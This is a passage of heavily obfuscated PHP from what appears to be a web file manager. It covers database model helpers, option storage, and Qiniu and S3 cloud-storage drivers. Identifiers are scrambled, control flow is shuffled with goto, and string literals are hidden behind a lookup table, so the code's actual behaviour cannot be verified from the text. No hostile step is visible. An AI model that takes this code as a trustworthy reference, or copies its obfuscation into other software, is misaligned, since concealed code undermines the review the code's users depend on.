$Dڮέפ = $D[384] . $b . $D[385]; if ($a睰ͮ[$D[386]]) { $Dڮέפ = $D[385] . $b . $D[384]; } } $AЦܬ[$eڮ铭] = $D[387] . $d∺ . $D[388] . $Dڮέפ . $D[389]; $eڮ铭++; goto F; bͬ: } if (is_array($Bէ)) { $FԉȄ = is_string($dܶ즏) ? $dܶ즏 : $FԉȄ; $Bէ = $this->parseWhereLike($Bէ, $FԉȄ, !0, $f); } if (is_numeric($dܶ즏)) { $AЦܬ[$eڮ铭] = $Bէ; $eڮ铭++; } else { $AЦܬ[$dܶ즏] = $Bէ; } } if ($f && !$Cܵ) { } return $AЦܬ; goto fޤ; B: $D =& $_SERVER[̉]; $a睰ͮ = $GLOBALS[$D[6]][$D[378]]; if (!$a睰ͮ[$D[379]]) { return $b⯏; } goto e̝墊; fޤ: } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($cջš = array()) { goto c뉅; c뉅: $FϝӜ =& $_SERVER[̉]; $FҠ = self::SQL_WHERE_IN_CHUNK; $E = $this->optionsValue(); goto d; Dά: return $Dۜ; goto aØ☸; d: $C = $this->findWhereField($E); if (!$C || isset($E[$FϝӜ[290]]) || isset($E[$FϝӜ[351]])) { return parent::select($cջš); } $b = $E[$FϝӜ[273]][$C][1]; goto Bٽ驷; Bٽ驷: $b = is_array($b) ? $b : array(); $Dۜ = null; for ($cݠ = 0; $cݠ < count($b); $cݠ += $FҠ) { $Aܲ = array_slice($b, $cݠ, $FҠ); if (!is_array($Aܲ) || count($Aܲ) == 0) { break; } $E[$FϝӜ[273]][$C][1] = $Aܲ; $this->optionsValue($E); $dծ = parent::select($cջš); if (!$dծ) { continue; } $Dۜ = is_array($Dۜ) ? $Dۜ : array(); $Dۜ = array_merge($Dۜ, $dծ); } goto Dά; aØ☸: } public function delete($BӞԋ = array()) { goto B; E: $Dﴘ = $this->findWhereField($aή); if (!$Dﴘ) { return parent::delete($BӞԋ); } $Fí = 0; goto e٥; e٥: $cʐ = $aή[$bݴ[273]][$Dﴘ][1]; $cʐ = is_array($cʐ) ? $cʐ : array(); for ($f = 0; $f < count($cʐ); $f += $b݉) { $E = array_slice($cʐ, $f, $b݉); if (!is_array($E) || count($E) == 0) { break; } $aή[$bݴ[273]][$Dﴘ][1] = $E; $this->optionsValue($aή); $Fí += parent::delete($BӞԋ); } goto EϽ; EϽ: return $Fí; goto F; B: $bݴ =& $_SERVER[̉]; $b݉ = self::SQL_WHERE_IN_CHUNK; $aή = $this->optionsValue(); goto E; F: } private function findWhereField($b뵌) { $B㉛ =& $_SERVER[̉]; $Aᅉ = self::SQL_WHERE_IN_CHUNK; if (!is_array($b뵌) || !is_array($b뵌[$B㉛[273]])) { return !1; } foreach ($b뵌[$B㉛[273]] as $F => $AᕈÕ) { if (is_array($AᕈÕ) && isset($AᕈÕ[0]) && is_string($AᕈÕ[0]) && strtolower($AᕈÕ[0]) == $B㉛[7] && is_array($AᕈÕ[1]) && count($AᕈÕ[1]) > $Aᅉ) { ignore_timeout(); return $F; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\x79\x73\164\x65\155\117\x70\164\x69\x6f\156"; public $field = array(); public function listData($bĂ = false, $aߗ = "\x6d\157\144\151\x66\x79\x54\x69\x6d\145", $a = false) { $CĽ = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$CĽ) { return $bĂ ? null : array(); } if (!$bĂ) { $CĽ = array_filter(array_values($CĽ)); return array_sort_by($CĽ, $aߗ, $a); } return $CĽ[$_SERVER[̉][390] . $bĂ]; } public function insert($E慦) { goto d짠; d짠: $F󃇙 =& $_SERVER[̉]; $E慦 = array_field_key($E慦, $this->field); $C = Model($this->modelType)->get($F󃇙[391], $this->optionType . $F󃇙[392]); goto cԙ֗Ӌ; f: $E慦[$F󃇙[84]] = time(); Model($this->modelType)->set($F󃇙[391], $C, $this->optionType . $F󃇙[392]); Model($this->modelType)->set($F󃇙[390] . $C, $E慦, $this->optionType); goto Eӭͧ; Eӭͧ: return $C; goto Aխ; cԙ֗Ӌ: $C = $C ? $C : 0; $E慦[$F󃇙[393]] = ++$C; $E慦[$F󃇙[194]] = time(); goto f; Aխ: } public function update($dЯԐ, $d؈ϲ) { goto dۉ; C: if (!$Fح衅) { return !1; } $d؈ϲ = array_merge($Fح衅, $d؈ϲ); $d؈ϲ[$B[84]] = time(); goto AĨ; AĨ: return Model($this->modelType)->set($B[390] . $dЯԐ, $d؈ϲ, $this->optionType); goto CՌ; dۉ: $B =& $_SERVER[̉]; $d؈ϲ = array_field_key($d؈ϲ, $this->field); $Fح衅 = $this->listData($dЯԐ); goto C; CՌ: } public function remove($C) { return Model($this->modelType)->remove($_SERVER[̉][390] . $C, $this->optionType); } public function clear() { $C =& $_SERVER[̉]; Model($this->modelType)->remove($C[391], $this->optionType . $C[392]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($D, $eۍҍ) { if (!$eۍҍ) { return !1; } $fڜˎ = $this->listData(); $fڜˎ = array_to_keyvalue($fڜˎ, $D); return isset($fڜˎ[$eۍҍ]) ? $fڜˎ[$eۍҍ] : !1; } public function findByName($DĖ) { return $this->findByKey($_SERVER[̉][28], $DĖ); } protected function resetData($C䘠Ì) { $cȬ鳊 =& $_SERVER[̉]; $C䘠Ì = is_array($C䘠Ì) ? $C䘠Ì : array(); $Fݧ = array(); for ($c = 0; $c < count($C䘠Ì); $c++) { $Fݧ[$cȬ鳊[390] . $C䘠Ì[$c][$cȬ鳊[393]]] = $C䘠Ì[$c]; } return Model($this->modelType)->set($Fݧ, !1, $this->optionType); } private function getAutoName($Aۏ) { $f = array_to_keyvalue($this->listData(), $_SERVER[̉][28]); if (!$f || !isset($f[$Aۏ])) { return $Aۏ; } for ($dȃ = 1; $dȃ < count($f); $dȃ++) { $dڌ̏ = $Aۏ . "\50{$dȃ}\x29"; if (!isset($f[$dڌ̏])) { return $dڌ̏; } } return $dڌ̏; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($A􆯠 = false, $cщ = '', $CІ = false) { goto cỄ; dȼý: $Dտ = is_array($Dտ) ? $Dտ : array(); if (is_array($B񓈾)) { $B񓈾 = array_merge($Dտ, $B񓈾); return $A􆯠 ? isset($B񓈾[$A􆯠]) ? $B񓈾[$A􆯠] : null : $B񓈾; } $Bᤊ = $this->filterWhere(array($f[29] => $cщ)); goto bۗ­; bۗ­: $B񓈾 = $this->where($Bᤊ)->select(); $B񓈾 = array_to_keyvalue($B񓈾, $f[93], $f[372]); foreach ($B񓈾 as $fӃ => $eܽ) { if ($CІ || in_array($fӃ, $this->jsonField)) { $B񓈾[$fӃ] = json_decode($eܽ, !0); } } goto cŵ։; cỄ: $f =& $_SERVER[̉]; $B񓈾 = $this->cacheGet($cщ); $Dտ = $this->optionDefault($cщ); goto dȼý; cŵ։: $this->cacheSet($cщ, $B񓈾); $B񓈾 = array_merge($Dտ, $B񓈾); return $A􆯠 ? $B񓈾[$A􆯠] : $B񓈾; goto bږ; bږ: } public function set($Eג, $EЅۥ = false, $C胷 = '') { goto F݈; fޗ: $b = is_array($Eג) ? $Eג : array($Eג => $EЅۥ); foreach ($b as $FΛ => $dΧ) { if (is_array($dΧ)) { $dΧ = json_encode_force($dΧ); } $this->checkLength($dΧ, !1, $this->tableName . $d΄[4] . $Eג); $dΧ = self::textEncode($dΧ); $b = array($d΄[29] => $C胷, $d΄[93] => $FΛ, $d΄[372] => $dΧ); $bƊ͸[] = $this->filterWhere($b); } if (!$bƊ͸) { return !0; } goto aӂ; F݈: $d΄ =& $_SERVER[̉]; $this->cacheRemove($C胷); $bƊ͸ = array(); goto fޗ; aӂ: return $this->addAll($bƊ͸, array(), !0); goto Fȗѻ; Fȗѻ: } protected function optionDefault($fӢ = '') { return !1; } public function setDeep($b, $BӳԿ = false, $Eذ˽ = '') { $eɛ = explode($_SERVER[̉][95], $b); $b = $this->get(); array_set_value($b, $b, $BӳԿ); $this->set($eɛ[0], $b[$eɛ[0]], $Eذ˽); } public function remove($bɢ, $E = '') { $cÖ =& $_SERVER[̉]; $this->cacheRemove($E); $b㸾 = $this->filterWhere(array($cÖ[93] => $bɢ, $cÖ[29] => $E)); if (is_null($bɢ)) { unset($b㸾[$cÖ[93]]); } return $this->where($b㸾)->delete(); } public function cacheSet($F񜈶, $D = false) { return Cache::set($this->cacheKey($F񜈶), $D); } public function cacheGet($b۬) { return Cache::get($this->cacheKey($b۬)); } public function cacheRemove($D՞) { return Cache::remove($this->cacheKey($D՞)); } protected function filterWhere($Dഢל) { return $Dഢל; } protected function cacheKey($d) { return $d; } } goto a; C: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public function __construct($a) { parent::__construct(); require_once SDK_DIR . $_SERVER[̉][1303]; $this->_init($a); } public function _init($Aα) { goto F; F: $eǞ =& $_SERVER[̉]; foreach ($Aα as $B => $F) { if (isset($this->{$B})) { $this->{$B} = $F; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($eǞ[1304] . LNG($eǞ[1263])); } goto A͚ц; c쎏: $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); goto Dǹ; A͚ц: $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); goto c쎏; Dǹ: } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($Bȣ, $a = '', $c񉐖 = REPEAT_RENAME) { if ($this->setContent($Bȣ, $a)) { return $this->getPathOuter($Bȣ); } return !1; } public function mkdir($bט, $fٕƊ = REPEAT_SKIP) { goto Bʗ; c: if (!$this->mkfile($Eת鈏)) { return !1; } if (!$this->moveFile($Eת鈏, $bט)) { $this->delFile($Eת鈏); return !1; } return $this->getPathOuter($Fѷ); goto CٷІӳ; aކ: $bט = $Fѷ . $f뭔[8]; $a⿥׬ = get_path_this($Fѷ); $Eת鈏 = $bט . $a⿥׬; goto c; Bʗ: $f뭔 =& $_SERVER[̉]; $Fѷ = trim($bט, $f뭔[8]); if ($this->_isFolder($Fѷ)) { return $this->getPathOuter($Fѷ); } goto aކ; CٷІӳ: } public function copyFile($B, $b˶ͦڃ) { $F = $this->bucketManager->copy($this->bucket, $B, $this->bucket, $b˶ͦڃ, !0); return $F ? !1 : $this->getPathOuter($b˶ͦڃ); } public function moveFile($eŞ, $Aۥ) { $bɈ = $this->bucketManager->move($this->bucket, $eŞ, $this->bucket, $Aۥ, !0); return $bɈ ? !1 : $this->getPathOuter($Aۥ); } public function delFile($Fʣ) { if (!$this->exist($Fʣ)) { return !0; } $Dɬ = $this->bucketManager->delete($this->bucket, $Fʣ); return $Dɬ ? !1 : !0; } public function delFolder($A٩) { goto FҾʙټ; fֻ: if (!empty($A٩) && $A٩ !== $e늸[191] && !in_array($f깃北, $E犪[$e늸[75]])) { $E犪[$e늸[75]][] = $f깃北; } $dњї = $this->delByBatch($E犪[$e늸[74]]); if (!$dњї) { return !1; } goto bݰ; bݰ: $dњї = $this->delByBatch($E犪[$e늸[75]]); if (!$dњї) { return !1; } return $this->delFile($f깃北); goto Fʴ; DÕĊ: $E犪 = $this->fileList($A٩); $this->listItemCache = !0; $f깃北 = trim($A٩, $e늸[8]) . $e늸[8]; goto fֻ; FҾʙټ: $e늸 =& $_SERVER[̉]; if (!$this->exist($A٩)) { return !0; } $this->listItemCache = !1; goto DÕĊ; Fʴ: } private function delByBatch($CȬ) { foreach (array_chunk($CȬ, 1000) as $F) { $C = $this->bucketManager->buildBatchDelete($this->bucket, $F); list($Cٺ, $c乂) = $this->bucketManager->batch($C); if ($c乂) { return !1; } } return !0; } public function rename($C퓈, $F) { return $this->renameObject($C퓈, $F); } public function fileInfo($BϢ, $Eͼ = false, $F޲ = array()) { goto E㎦Ê; E㎦Ê: $aғ⛿ =& $_SERVER[̉]; $aА = array($aғ⛿[28] => $this->pathThis($BϢ), $aғ⛿[76] => $this->getPathOuter($aғ⛿[8] . $BϢ), $aғ⛿[29] => $aғ⛿[193], $aғ⛿[78] => isset($F޲[$aғ⛿[1305]]) ? $F޲[$aғ⛿[1305]] : 0, $aғ⛿[168] => $this->ext($BϢ)); if ($Eͼ) { return $aА; } goto Eח; bϝ: if (isset($F޲[$aғ⛿[1306]])) { $aА[$aғ⛿[84]] = substr($F޲[$aғ⛿[1306]] . $aғ⛿[33], 0, 10); } if (isset($F޲[$aғ⛿[1305]])) { $aА[$aғ⛿[78]] = $F޲[$aғ⛿[1305]]; } return $aА; goto F; Eח: $aА[$aғ⛿[194]] = $aА[$aғ⛿[84]] = 0; $aА[$aғ⛿[195]] = $aА[$aғ⛿[196]] = !0; if (empty($F޲)) { $F޲ = $this->objectMeta($BϢ); if (!$F޲) { return $aА; } } goto bϝ; F: } public function folderInfo($d, $DԺ = false) { goto CѸٕ; E𺝋: $dڔ[$A[194]] = $dڔ[$A[84]] = 0; $dڔ[$A[195]] = $dڔ[$A[196]] = !0; $d = rtrim($d, $A[8]) . $A[8]; goto f; f: $c = $this->objectMeta($d); if (isset($c[$A[1306]])) { $dڔ[$A[84]] = substr($c[$A[1306]] . $A[33], 0, 10); } return $dڔ; goto c; CѸٕ: $A =& $_SERVER[̉]; $dڔ = array($A[28] => $this->pathThis($d), $A[76] => $this->getPathOuter($A[8] . $d), $A[29] => $A[77]); if ($DԺ) { return $dڔ; } goto E𺝋; c: } public function listPath($bο, $Fń = false) { $Cێ =& $_SERVER[̉]; $c = $this->fileList($bο, $Cێ[8], !0); foreach ($c[$Cێ[75]] as $C惕 => $eߵ΃) { $c[$Cێ[75]][$C惕] = $this->folderInfo($eߵ΃, $Fń); } foreach ($c[$Cێ[74]] as $C惕 => $eߵ΃) { $c[$Cێ[74]][$C惕] = $this->fileInfo($eߵ΃[$Cێ[93]], $Fń, $eߵ΃); } return $c; } public function has($d㰐, $cɎ = false, $Cԩ = true) { goto dㅐ; Bޙ: return !1; goto Dӛ; eޤ: $c珛 = $fʶ = 0; while (!0) { check_abort(); list($dښҿ, $Cڌள) = $this->bucketManager->listFiles($this->bucket, $b, $f, $AІ, $d˗); if ($Cڌள) { break; } $f = array_key_exists($aĪ[1275], $dښҿ) ? $f = $dښҿ[$aĪ[1307]] : $aĪ[33]; if ($cɎ) { if (!empty($dښҿ[$aĪ[1308]])) { $c珛 += count($dښҿ[$aĪ[1308]]); } if (!empty($dښҿ[$aĪ[1309]])) { $fʶ += count($dښҿ[$aĪ[1309]]); } if ($f === $aĪ[33]) { break; } continue; } if ($Cԩ) { if (!empty($dښҿ[$aĪ[1308]])) { return !0; } } else { if (!empty($dښҿ[$aĪ[1309]])) { return !0; } } if ($f === $aĪ[33]) { break; } } if ($cɎ) { return array($aĪ[203] => $c珛, $aĪ[204] => $fʶ); } goto Bޙ; eُ: $f = $aĪ[33]; $AІ = 500; $d˗ = $aĪ[8]; goto eޤ; dㅐ: $aĪ =& $_SERVER[̉]; $d㰐 = trim($d㰐, $aĪ[8]); $b = empty($d㰐) && $d㰐 !== $aĪ[191] ? $aĪ[33] : $d㰐 . $aĪ[8]; goto eُ; Dӛ: } public function listAll($Aɘ) { $F =& $_SERVER[̉]; $A = $this->fileList($Aɘ, $F[33], !0); $D = array(); foreach ($A[$F[74]] as $E) { $D[$E[$F[93]]] = $E[$F[78]]; } foreach ($A[$F[75]] as $E) { if (is_string($E)) { $D[$E] = 0; } } return $this->listAllFiles($Aɘ, array_keys($D), $D); } private function fileList($e׉, $F = '', $Ał = 0) { goto e㶲; f˸: return array($Cԝ[75] => $bϑ, $Cԝ[74] => $eޗ); goto f; Eֆ: $A􍯮 = $Cԝ[33]; $A⹨ = 1000; $aլ = $this->listItemCache === !1 ? !1 : !0; goto A; A: $bϑ = $eޗ = array(); while (!0) { check_abort(); list($D×, $BҶ) = $this->bucketManager->listFiles($this->bucket, $Bޣë, $A􍯮, $A⹨, $F); if ($BҶ) { break; } $A􍯮 = array_key_exists($Cԝ[1275], $D×) ? $A􍯮 = $D×[$Cԝ[1307]] : $Cԝ[33]; $E = isset($D×[$Cԝ[1308]]) ? $D×[$Cԝ[1308]] : array(); $a = isset($D×[$Cԝ[1309]]) ? $D×[$Cԝ[1309]] : array(); foreach ($E as $CҽݚɅ) { goto Dܪ; B: if ($F) { $bϑ[] = $dǑ; continue; } $eޗ[] = $Ał ? $CҽݚɅ : $dǑ; goto a; aٺ: $CҽݚɅ[$Cԝ[78]] = $FԵ; $F = $FԵ == 0 && substr($dǑ, strlen($dǑ) - 1, 1) == $Cԝ[8] ? !0 : !1; if ($aլ) { $this->cacheMethod($Cԝ[199], $dǑ, $F); $this->cacheMethod($Cԝ[200], $dǑ, $CҽݚɅ); } goto B; Dܪ: if ($CҽݚɅ[$Cԝ[93]] == $Bޣë) { continue; } $dǑ = $CҽݚɅ[$Cԝ[93]]; $FԵ = $CҽݚɅ[$Cԝ[1305]]; goto aٺ; a: } foreach ($a as $dǑ) { if ($dǑ == $Bޣë) { continue; } $bϑ[] = $dǑ; if ($aլ) { $this->cacheMethod($Cԝ[199], $dǑ, !0); } } if ($A􍯮 === $Cԝ[33]) { break; } } if ($aլ) { $this->cacheMethod($Cԝ[199], $e׉, !0); } goto f˸; e㶲: $Cԝ =& $_SERVER[̉]; $e׉ = trim($e׉, $Cԝ[8]); $Bޣë = empty($e׉) && $e׉ !== $Cԝ[191] ? $Cԝ[33] : $e׉ . $Cԝ[8]; goto Eֆ; f: } public function canRead($c) { return $this->exist($c) ? !0 : !1; } public function canWrite($cꇰ) { return $this->exist($cꇰ) ? !0 : !1; } public function getContent($fغ͇) { return $this->fileSubstr($fغ͇, 0, -1); } public function setContent($fϙے, $D = '') { $B񪟐 = $this->tempFile($this->pathThis($fϙے)); file_put_contents($B񪟐, $D); if ($this->upload($fϙے, $B񪟐)) { $this->tempFileRemve($B񪟐); return !0; } return !1; } public function refreshUrls($e) { goto Cׂ; Cׂ: $Cن̑ =& $_SERVER[̉]; $E̋ɘ = array(); if (is_array($e)) { foreach ($e as $bȆ) { $E̋ɘ[] = $this->link($bȆ); } } else { $E̋ɘ[] = $this->link($e); } goto cӢ; cӢ: $B = new Qiniu\Cdn\CdnManager($this->auth); list($F, $Eə) = $B->refreshUrls($E̋ɘ); if ($Eə) { return !1; } goto Aྜྷ; Aྜྷ: return $F[$Cن̑[1077]] == $Cن̑[723] ? !0 : !1; goto F; F: } public function fileSubstr($aі, $d, $D㫑) { $dܽ =& $_SERVER[̉]; if (!($dԚٵ = $this->link($aі))) { return !1; } $e = !1; if ($D㫑 > 0) { $Bگ = $d + $D㫑 - 1; $e = array($dܽ[1310] . $d . $dܽ[440] . $Bگ); } $c׷ = url_request($dԚٵ, $dܽ[228], !1, $e); return $c׷[$dܽ[713]] ? $c׷[$dܽ[1087]] : !1; } public function upload($d, $AÄ, $aŎ = false, $cΐ͚ = REPEAT_REPLACE) { $CҠ = new Qiniu\Storage\UploadManager(); $F쮆υ = $this->auth->uploadToken($this->bucket, $d); $Cÿ = get_file_mime(get_path_ext($AÄ)); list($C, $Cή) = $CҠ->putFile($F쮆υ, $d, $AÄ, null, $Cÿ); return $Cή ? !1 : $this->getPathOuter($d); } public function uploadFormData($aޚ, $FԠ = 3600) { return $this->uploadToken($aޚ, $FԠ); } public function multiUploadFormData($ãˈ, $AŅ = 3600) { return $this->uploadToken($ãˈ, $AŅ); } private function uploadToken($fĤϨ, $Eհ = 3600) { goto F; F: $C̑ =& $_SERVER[̉]; $F = $Eհ; $FѸ¥ = array($C̑[1311] => $C̑[1312]); goto Dɂ; c: $AĽ = http_type() . "\x3a\57\x2f\165\x70\154\157\141\x64{$d}\x2e\161\x69\x6e\x69\165\x70\x2e\x63\x6f\x6d\57"; return array($C̑[1314] => $F, $C̑[1315] => $AĽ); goto cѩ; Dɂ: $f = $fĤϨ; $F = $this->auth->uploadToken($this->bucket, $f, $F, $FѸ¥, !0); $d = empty($this->region) || $this->region == $C̑[1313] ? $C̑[33] : $C̑[440] . $this->region; goto c; cѩ: } public function download($b, $CӅ) { goto e۪; F: $f׹ߙ = 1024 * 200; $Fو = fopen($Bȸ, $_SERVER[̉][1316]); while (!0) { $B׉ = $this->fileSubstr($b, $cو, $f׹ߙ); if ($B׉ === !1) { return !1; } fwrite($Fو, $B׉); $cو += $f׹ߙ; if (strlen($B׉) < $f׹ߙ) { break; } } goto B۳; e۪: $Bȸ = IO::getPathInner(IO::mkfile($CӅ)); if (!($DġĢ = $this->link($b))) { return !1; } $cو = 0; goto F; B۳: fclose($Fو); return $CӅ; goto aψ費; aψ費: } public function link($f, $B͆ = '') { if (!$this->isFile($f)) { return !1; } $Bِ = $this->getHost() . $_SERVER[̉][8] . $this->pathEncode($f) . $B͆; return $this->auth->privateDownloadUrl($Bِ, 3600 * 12); } public function fileOut($dم, $D = false, $A = false, $a = '') { $Eή =& $_SERVER[̉]; if ($this->isFileOutServer()) { return $this->fileOutServer($dم, $D, $A, $a); } if (!$A) { $A = $this->pathThis($dم); } $f﶐Џ = $D ? $Eή[1317] . rawurlencode($A) : $Eή[33]; $Dۈ = $this->link($dم, $f﶐Џ); $this->fileOutLink($Dۈ); } public function fileOutServer($B, $AՆ = false, $b镶 = false, $Aԇ = '') { parent::fileOut($B, $AՆ, $b镶, $Aԇ); } public function fileOutImage($c, $b㋼𑓙 = 250) { $eՃ = $this->link($c, $_SERVER[̉][1318] . $b㋼𑓙); $this->fileOutLink($eՃ); } public function fileOutImageServer($DΨ, $E = 250) { parent::fileOutImage($DΨ, $E); } public function hashMd5($B) { $B̌ =& $_SERVER[̉]; $a﹎ = $this->objectMeta($B); return isset($a﹎[$B̌[208]]) ? $a﹎[$B̌[208]] : !1; $a = $this->link($B, $B̌[1319]); } public function size($Dި) { $f = $this->objectMeta($Dި); return $f ? $f[$_SERVER[̉][78]] : 0; } public function info($d孟䘾) { if ($this->isFolder($d孟䘾)) { return $this->folderInfo($d孟䘾); } else { if ($this->isFile($d孟䘾)) { return $this->fileInfo($d孟䘾); } } return !1; } public function exist($C) { return $this->isFile($C) || $this->isFolder($C); } public function isFile($c׺) { return !$this->isFolder($c׺) && $this->objectMeta($c׺); } public function isFolder($CՕ) { return $this->cacheMethod($_SERVER[̉][199], $CՕ); } protected function objectMeta($AЦ) { return $this->cacheMethod($_SERVER[̉][200], $AЦ); } protected function _objectMeta($C) { $eɋ =& $_SERVER[̉]; list($dў, $Cń) = $this->bucketManager->stat($this->bucket, $C); if ($dў) { $dў[$eɋ[78]] = intval($dў[$eɋ[1305]]); } return $dў; } protected function _isFolder($Ą) { $d唌 =& $_SERVER[̉]; if ($Ą == $d唌[33] || $Ą == $d唌[8]) { return !0; } list($aӈ, $f) = $this->bucketManager->listFiles($this->bucket, trim($Ą, $d唌[8]) . $d唌[8], $d唌[33], 1, $d唌[8]); return !empty($aӈ[$d唌[1308]]) || !empty($aӈ[$d唌[1309]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($b踋) { parent::__construct($b踋); } public function uploadFormData($e㜂, $FӃ = 3600) { goto F׷; e: $f٪Κ = array($this->accessKey, $a寈, $this->region, $CɎ, $c); $C茞 = implode($FǷ[8], $f٪Κ); $E = array($FǷ[1190] => gmdate($FǷ[1189], strtotime($FǷ[1228])), $FǷ[1191] => array(array($FǷ[1193] => $this->bucket), array($FǷ[1192] => $A閅ǯ), array($FǷ[1194], $FǷ[1195], $FǷ[33]), array($FǷ[1194], $FǷ[1229], $FǷ[33]), array($FǷ[1194], $FǷ[1230], $FǷ[33]), array($FǷ[1196] => $b), array($FǷ[1231] => $C茞), array($FǷ[1232] => $b), array($FǷ[1233] => $A), array($FǷ[1234] => $fّԔ))); goto F幊ҕ; B: $dސ = array($FǷ[211] => $FǷ[33], $FǷ[1237] => $FǷ[33], $FǷ[1192] => $A閅ǯ, $FǷ[1196] => $b, $FǷ[1200] => $f܍, $FǷ[1238] => $C茞, $FǷ[1239] => $b, $FǷ[1240] => $A, $FǷ[1241] => $fّԔ, $FǷ[1242] => $Dą, $FǷ[175] => $this->getHost()); return $dސ; goto Dѯ; D: $c݆ = hash_hmac($FǷ[1235], $CɎ, $a, !0); $F = hash_hmac($FǷ[1235], $c, $c݆, !0); $Dą = hash_hmac($FǷ[1235], $f܍, $F); goto B; c: $c = $FǷ[1227]; $fّԔ = $FӃ . $FǷ[33]; $b = $FǷ[1188]; goto e; Cȩ: $CɎ = $FǷ[59]; $A = gmdate($FǷ[1226]); $a寈 = gmdate($FǷ[714]); goto c; F׷: $FǷ =& $_SERVER[̉]; $A閅ǯ = $FǷ[192]; $b = $FǷ[1225]; goto Cȩ; F幊ҕ: $f܍ = base64_encode(json_encode($E)); $BĪ = hash_hmac($FǷ[1235], $a寈, $FǷ[1236] . $this->secret, !0); $a = hash_hmac($FǷ[1235], $this->region, $BĪ, !0); goto D; Dѯ: } public function multiUploadFormData($C, $eՐί = 3600) { $Dۻ =& $_SERVER[̉]; $fޡ = gmdate($Dۻ[1320]); $C = array(); $fƉ = $this->client->getUploadId($this->bucket, $C, $C); if (!$fƉ) { return !1; } return array($Dۻ[221] => $fƉ, $Dۻ[175] => $this->getHost() . $Dۻ[8] . $this->pathEncode($C), $Dۻ[222] => $fޡ, $Dۻ[93] => $C); } public function multiUploadAuthData($fᢧ, $E樂 = array()) { goto b؎; Bم: $F؃ = $E[226]; $bɾޓ = $E[8] . $this->pathEncode($F݂) . $e·; $C = $this->client->__getSignatureV4($cޯ, $a, $F؃, $bɾޓ); goto C늓; C늓: if (strpos($e·, $E[225]) === 0) { if (isset($cޯ[$E[1322]])) { $d؎ = $cޯ[$E[1322]]; } else { if (isset($C[$E[1322]])) { $d؎ = $C[$E[1322]]; } else { $d؎ = hash($E[1235], $E[33]); } } return array($E[232] => $C[$E[232]], $E[1322] => $d؎, $E[222] => $C[$E[1325]]); } return $C[$E[232]]; goto DƎ; Bү: if (isset($E樂[$E[1321]])) { $cޯ[$E[1322]] = $E樂[$E[1321]]; } $B֍ = explode($E[177], $this->getHost()); $a = array($E[1323] => $B֍[1], $E[1324] => $E[33], $E[211] => $E[119], $E[1237] => $E樂[$E[78]]); goto Bم; b؎: $E =& $_SERVER[̉]; $e· = isset($E樂[$E[168]]) ? $E樂[$E[168]] : $E[33]; $F݂ = $E樂[$E[93]]; goto f훽; f훽: unset($E樂[$E[93]]); if (isset($E樂[$E[223]])) { return $this->listUploadParts($F݂, $E樂); } $cޯ = array(); goto Bү; DƎ: } public function listUploadParts($cԤ, $f = array()) { goto f˿; f: $F .= $C֒֠ͽ[1329]; $F = array(); $a񈭒 = explode($C֒֠ͽ[177], $this->getHost()); goto C튜; f˿: $C֒֠ͽ =& $_SERVER[̉]; $cފ = str_replace($C֒֠ͽ[233], $C֒֠ͽ[33], $f[$C֒֠ͽ[168]]); $a׆ = $this->client->listParts($this->bucket, $cԤ, $cފ); goto Cч䝍; C튜: $f¦ = array($C֒֠ͽ[1323] => $a񈭒[1], $C֒֠ͽ[211] => $C֒֠ͽ[119], $C֒֠ͽ[1237] => strlen($F)); $AۼԐ = $C֒֠ͽ[224]; $A۝ = $C֒֠ͽ[8] . $this->pathEncode($cԤ) . $f[$C֒֠ͽ[168]]; goto FƦ; FƦ: $dą = $this->client->__getSignatureV4($F, $f¦, $AۼԐ, $A۝, $F); return array($C֒֠ͽ[232] => $dą[$C֒֠ͽ[232]], $C֒֠ͽ[222] => $dą[$C֒֠ͽ[1325]], $C֒֠ͽ[234] => $a׆, $C֒֠ͽ[1322] => $dą[$C֒֠ͽ[1322]]); goto B; Cч䝍: if (!$a׆) { return !1; } $F = $C֒֠ͽ[1326]; foreach ($a׆ as $fҐ) { $F .= $C֒֠ͽ[1327] . "\x3c\120\x61\162\164\116\x75\155\142\145\x72\x3e{$fҐ[$C֒֠ͽ[1282]]}\74\x2f\120\x61\162\164\x4e\x75\x6d\142\145\x72\x3e\xa" . "\x3c\x45\124\x61\x67\76{$fҐ[$C֒֠ͽ[1283]]}\74\x2f\x45\124\x61\x67\x3e\12" . $C֒֠ͽ[1328]; } goto f; B: } public function link($Dܣ, $c = array()) { return parent::link($Dܣ, $c); } public function fileOut($DÎ, $cȤ = false, $A = false, $Eὰ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[̉][1330])) { return parent::fileOutServer($DÎ, $cȤ, $A, $Eὰ); } parent::fileOut($DÎ, $cȤ, $A, $Eὰ); } public function fileOutImage($dͫ, $AΏŉ = 250) { if (strstr($this->endpoint, $_SERVER[̉][1330])) { return parent::fileOutImageServer($dͫ, $AΏŉ); } parent::fileOutImage($dͫ, $AΏŉ); } public function fileOutLink($aߒ) { $f΄ =& $_SERVER[̉]; if (substr($aߒ, 0, 7) == $f΄[1203]) { $aߒ = $f΄[1204] . substr($aߒ, 7); } header($f΄[159] . $aߒ); die; } public function getHost() { $eʏ =& $_SERVER[̉]; $Bܲ = str_rtrim(parent::getHost(), $eʏ[8] . $this->bucket); $Bܲ = explode($eʏ[177], $Bܲ); return $Bܲ[0] . $eʏ[177] . $this->bucket . $eʏ[95] . $Bܲ[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($C, 